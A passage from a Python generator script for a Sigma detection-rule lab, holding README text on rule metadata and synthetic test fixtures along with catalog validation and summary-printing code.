for detection engineering but not part of the Sigma specification lives here: the detection
hypothesis, telemetry prerequisites, tuning guidance, ATT&CK defensive-object mappings, and
the backend conversion status.

## Catalog identifiers

| Prefix | Family | Range |
| --- | --- | --- |
| `SDEL-WIN` | Windows process, system, defense evasion, and persistence | 001 to 016 |
| `SDEL-PS` | PowerShell | 001 to 010 |
| `SDEL-ID` | Windows identity and Active Directory | 001 to 012 |
| `SDEL-LX` | Linux | 001 to 012 |
| `SDEL-COR` | Sigma correlation | 001 to 006 |

The Sigma `id` of each rule is derived deterministically with
`uuid.uuid5(uuid.NAMESPACE_URL, "https://github.com/salvomazzaglia/sigma-detection-engineering-lab/<catalog-id>")`,
so a catalog identifier and its UUID can always be re-derived from each other.

## Required fields

Each sidecar contains `schema_version`, `catalog_id`, `sigma_rule_id`, `title`,
`detection_hypothesis`, `platform`, `rule_family`, `maturity`, `required_logs`,
`required_channels`, `required_fields`, `optional_fields`, `field_semantics`,
`collection_prerequisites`, `expected_collection_gaps`, `normalization_assumptions`,
`ingestion_differences`, `retention_considerations`, `expected_volume`,
`false_positive_strategy`, `tuning_guidance`, `test_strategy`, `minimum_positive_tests`,
`minimum_negative_tests`, `attack_techniques`, `attack_tactics`,
`attack_detection_strategies`, `attack_analytics`, `attack_data_components`,
`unmapped_defensive_objects_reason`, `supported_backends`, `unsupported_backend_reasons`,
`related_rules`, `author`, `created_at`, `modified_at`, and `version`.

## Maturity

Only `experimental` and `tested-synthetic` are used. No rule in this repository claims
production maturity, and Sigma `status: stable` is blocked by the quality gates.

## ATT&CK defensive objects

Detection Strategy, Analytic, and Data Component identifiers are recorded only when they were
present in the pinned ATT&CK extraction under `data/attack/`. When no verified mapping exists,
the arrays stay empty and `unmapped_defensive_objects_reason` explains why. Identifiers are
never invented, and Sigma tags never carry defensive-object identifiers.

## Regeneration

Sidecars are generated together with the rules and fixtures by `tools/generate_all_rules.py`.
Edit the data definition in that script rather than editing generated files by hand.
"""

FIXTURES_README = """# Synthetic Fixtures

This directory holds the deterministic synthetic telemetry used to test the rule catalog.
Nothing here is derived from production systems.

## Layout

```
fixtures/
├── rules/<catalog-id>/          standard rules
│   ├── manifest.json
│   ├── positive/                cases that must match
│   └── negative/                near misses that must not match
└── correlation/<catalog-id>/    correlation rules
    ├── manifest.json
    ├── positive/                sequences that must match
    └── negative/                sequences that must not match
```

Standard rules carry at least two positive cases and three negative cases. Correlation rules
carry at least two positive sequences and two negative sequences.

## Event model

Fixtures are JSON Lines. One event per line, with these fields:

| Field | Meaning |
| --- | --- |
| `schema_version` | Fixture schema version |
| `event_id` | Stable identifier of the event inside its case |
| `timestamp_utc` | Event time in `YYYY-MM-DDTHH:MM:SSZ` form |
| `synthetic` | Always `true` |
| `platform` | `windows` or `linux` |
| `logsource` | Sigma logsource that the event belongs to |
| `channel` | Log channel or file that carried the record |
| `provider` | Producer of the record |
| `host` | Synthetic host name |
| `user` | Synthetic account context |
| `fields` | Normalized detection fields |
| `scenario` | Short description of what the case represents |
| `notes` | Why the case matches or does not match |

## Synthetic placeholders

Only these placeholder families appear in fixtures: `SYNTHETIC-HOST-01`, `SYNTHETIC-DC01`,
`SYNTHETIC-LINUX-01`, `synthetic-user`, `synthetic-admin`, `synthetic-service`, the
`example.invalid` and `synthetic.invalid` domains, the `192.0.2.0/24` documentation address
range, Windows paths under `C:\\Synthetic\\`, Linux paths under `/tmp/synthetic-example`, the
`SYNTHETIC_ENCODED_PLACEHOLDER` string, and `https://example.invalid/synthetic` URLs.

There are no real credentials, no routable addresses, no executable payloads, and no decodable
encoded content. Encoded-command fixtures deliberately carry a placeholder that does not decode
to anything.

## Negative case design

Every negative case is a near miss rather than unrelated noise. Each one breaks exactly one
requirement of the rule, so a regression in a single selection is caught by a specific case.
Correlation negatives break exactly one of ordering, grouping, threshold, or timespan.

## Regeneration

Fixtures are generated by `tools/generate_all_rules.py`, which also verifies that every
positive case matches its rule and every negative case does not before writing the manifests.
"""


def generate_readmes() -> None:
    write_text(ROOT / "metadata" / "README.md", METADATA_README)
    write_text(ROOT / "fixtures" / "README.md", FIXTURES_README)


# --------------------------------------------------------------------------------------
# Entry point
# --------------------------------------------------------------------------------------


def validate_catalog() -> list[str]:
    errors: list[str] = []
    seen_ids: set[str] = set()
    seen_uuids: set[str] = set()
    for spec in RULES + CORRELATIONS:
        cid = spec["cid"]
        if cid in seen_ids:
            errors.append(f"duplicate catalog id: {cid}")
        seen_ids.add(cid)
        identifier = rule_uuid(cid)
        if identifier in seen_uuids:
            errors.append(f"duplicate uuid for {cid}")
        seen_uuids.add(identifier)
        for tid in spec["techniques"] + spec.get("extra_techniques", []):
            if tid not in TECHNIQUES:
                errors.append(f"{cid} references unknown technique {tid}")
        if len(spec["refs"]) < 1:
            errors.append(f"{cid} has no references")
        for text in spec["fps"]:
            if text.strip().lower() in {"unknown", "legitimate activity", "administrator activity"}:
                errors.append(f"{cid} has a non-specific false positive entry")
        if spec.get("status", "experimental") not in {"experimental", "test"}:
            errors.append(f"{cid} has a disallowed status")
        if spec["level"] not in {"informational", "low", "medium", "high", "critical"}:
            errors.append(f"{cid} has an invalid level")
    return errors


def main() -> int:
    catalog_errors = validate_catalog()
    clean_generated_directories()

    standard = generate_standard_rules()
    correlation = generate_correlation_rules()
    generate_attack_data()
    generate_config_files()
    generate_readmes()

    errors = catalog_errors + standard[4] + correlation[4]

    rule_yaml_files = sorted((ROOT / "rules").rglob("*.yml"))
    sidecar_files = sorted((ROOT / "metadata" / "rules").glob("*.json"))
    positive_files = sorted((ROOT / "fixtures").rglob("positive/*.jsonl"))
    negative_files = sorted((ROOT / "fixtures").rglob("negative/*.jsonl"))
    manifest_files = sorted((ROOT / "fixtures").rglob("manifest.json"))

    levels: dict[str, int] = {}
    for spec in RULES + CORRELATIONS:
        levels[spec["level"]] = levels.get(spec["level"], 0) + 1

    print("=" * 72)
    print("sigma-detection-engineering-lab catalog generation")
    print("=" * 72)
    print(f"standard rules written              : {standard[0]}")
    print(f"correlation rules written           : {correlation[0]}")
    print(f"rule yml files on disk              : {len(rule_yaml_files)}")
    print(f"sidecar json files on disk          : {len(sidecar_files)}")
    print(f"fixture manifests on disk           : {len(manifest_files)}")
    print(f"positive fixture files on disk      : {len(positive_files)}")
    print(f"negative fixture files on disk      : {len(negative_files)}")
    print(f"standard positive cases             : {standard[2]}")
    print(f"standard negative cases             : {standard[3]}")
    print(f"correlation positive sequences      : {correlation[2]}")
    print(f"correlation negative sequences      : {correlation[3]}")
    print(f"referenced attack techniques        : {len(collect_referenced_techniques())}")
    print("level distribution                  : " + ", ".join(
        f"{level}={levels.get(level, 0)}"
        for level in ("informational", "low", "medium", "high", "critical")
    ))

    family_counts: dict[str, int] = {}
    for spec in RULES:
        family_counts[spec["family"]] = family_counts.get(spec["family"], 0) + 1
    family_counts["correlation"] = len(CORRELATIONS)
    print("family distribution                 : " + ", ".join(
        f"{name}={count}" for name, count in sorted(family_counts.items())
    ))

    if errors:
        print("-" * 72)
        print(f"ERRORS: {len(errors)}")
        for message in errors:
            print(f"  - {message}")
        return 1

    print("-" * 72)
    print("verification: all positive fixtures match and all negative fixtures are rejected")
    return 0


if __name__ == "__main__":
    sys.exit(main())
